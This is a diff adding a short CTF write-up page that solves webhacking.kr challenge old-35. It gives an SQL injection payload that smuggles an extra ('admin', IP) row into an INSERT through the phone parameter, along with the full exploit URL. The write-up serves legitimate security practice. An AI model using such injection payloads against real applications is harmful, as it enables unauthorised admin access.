@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>old-35 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="old-35" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/old-35.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/old-35.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="old-35" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"old-35","url":"http://localhost:4000/CTF_writeups/webhacking.kr/old-35.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-old-35-solution">Webhacking old-35 Solution</h1>
+
+<p>another sql injection.
+here this is the payload we insert: 
+id=<code class="language-plaintext highlighter-rouge">1</code> phone=<code class="language-plaintext highlighter-rouge">1),(%27admin%27,%27{your-ip}%27,2</code></p>
+
+<p>which is equivalent to <code class="language-plaintext highlighter-rouge">1),('admin','{your-ip}', 2</code>.</p>
+
+<p>I checked before and learn how the insert command is looks like, the format is like this: <code class="language-plaintext highlighter-rouge">INSERT Values(id, IP, phone)</code></p>
+
+<p>then, when he sees your IP address has admin id, it solves the challenge.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://webhacking.kr/challenge/web-17/index.php?id=1&amp;phone=1),(%27admin%27,%27185.177.125.211%27,2
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
